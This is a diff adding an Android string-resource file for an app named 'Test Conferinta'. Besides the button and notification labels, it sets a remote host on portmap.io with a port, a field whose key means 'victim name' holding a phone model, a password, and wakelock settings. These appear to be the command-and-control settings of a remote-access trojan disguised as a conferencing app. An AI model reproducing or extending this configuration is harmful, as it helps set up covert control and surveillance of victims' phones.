@@ -1,0 +1,14 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<resources>
+  <string name="stop_timestamp_service_button_text">DURDUR</string>
+  <string name="restart_timestamp_service_button_text">BASLAT</string>
+  <string name="app_name">Test Conferinta</string>
+  <string name="service_started">Test Conferinta</string>
+  <string name="notification_text">Test Conferinta</string>
+  <string name="IP">Fivel-39615.portmap.io</string>
+  <string name="PORT">39615</string>
+  <string name="KURBANISMI">Victima Note10</string>
+  <string name="PASSWORD">1234</string>
+  <string name="Ignore">1</string>
+  <string name="wakelock">1</string>
+</resources>
